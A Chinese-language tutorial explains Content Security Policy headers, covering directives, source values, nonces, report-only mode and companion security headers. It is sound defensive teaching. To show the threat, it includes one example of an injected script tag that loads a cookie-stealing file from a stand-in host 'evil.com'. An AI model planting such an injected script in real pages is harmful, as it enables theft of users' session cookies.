

> CSP 是一个 HTTP 响应头，用来告诉浏览器：**这个页面允许加载哪些来源的资源**。 是防御 **XSS（跨站脚本攻击）** 和 **数据注入攻击** 的重要手段。

---

## 一、它解决什么问题？

假设你的网站被植入了恶意脚本：

```html
<script src="https://evil.com/steal-cookies.js"></script>
```

- ❌ **没有 CSP**：浏览器会乖乖执行这段脚本
- ✅ **有了 CSP**：浏览器直接拒绝加载，攻击失效

---

## 二、基本语法

```
Content-Security-Policy: <指令> <来源>; <指令> <来源>;
```

### 常用指令

| 指令            | 控制的内容                         |
| ------------- | ----------------------------- |
| `default-src` | 默认规则（兜底，其他指令未设置时使用）           |
| `script-src`  | JavaScript 脚本                 |
| `style-src`   | CSS 样式表                       |
| `img-src`     | 图片                            |
| `connect-src` | fetch / XHR / WebSocket 等网络请求 |
| `font-src`    | 字体文件                          |
| `frame-src`   | iframe 嵌入内容                   |

### 常用来源值

|值|含义|
|---|---|
|`'self'`|只允许同源|
|`'none'`|全部禁止|
|`'unsafe-inline'`|允许内联脚本/样式（存在风险，尽量避免）|
|`'unsafe-eval'`|允许 `eval()` 等动态执行（存在风险）|
|`https://cdn.example.com`|指定白名单域名|
|`'nonce-xxxx'`|带 nonce 令牌的内联脚本（推荐替代 unsafe-inline）|

---

## 三、实际配置示例

### 严格策略（推荐）

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.jsdelivr.net;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
```

**解读：**

- 脚本只能来自本站和 jsDelivr CDN
- 样式允许内联（常见需求）
- 图片允许 data URI 和任意 HTTPS 来源
- 接口请求只能访问本站和指定 API 域名

---

### 使用 Nonce 允许特定内联脚本（更安全）

**响应头：**

```
Content-Security-Policy: script-src 'nonce-abc123'
```

**HTML：**

```html
<!-- 只有带匹配 nonce 的脚本才会被执行 -->
<script nonce="abc123">
  console.log('这段脚本被允许执行');
</script>

<!-- 没有 nonce 或 nonce 不匹配，浏览器拒绝执行 -->
<script>
  console.log('这段脚本会被拦截');
</script>
```

> ⚠️ nonce 值应每次请求随机生成，不可复用。

---

## 四、仅报告模式（上线前调试利器）

```
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

- **不会拦截**任何请求，只上报违规行为
- 非常适合**灰度测试 CSP 规则**，确认无误后再切换为正式头
- 违规报告以 JSON 格式 POST 到 `report-uri` 指定的接口

---

## 五、与其他 Web 性能/安全指标的关系

CSP 属于 **安全响应头**，与以下头部配合使用效果更佳：

| 响应头                                | 作用                    |
| ---------------------------------- | --------------------- |
| `X-Frame-Options`                  | 防止页面被 iframe 嵌入（点击劫持） |
| `X-Content-Type-Options: nosniff`  | 禁止浏览器 MIME 类型猜测       |
| `Strict-Transport-Security` (HSTS) | 强制使用 HTTPS            |
| `Referrer-Policy`                  | 控制 Referer 头的发送范围     |
|                                    |                       |

---

## 六、一句话总结

> CSP 就是给浏览器一份**白名单**，凡是不在白名单上的脚本、样式、图片、请求，一律拒绝执行——即使攻击者成功注入了恶意代码，浏览器也不会理它。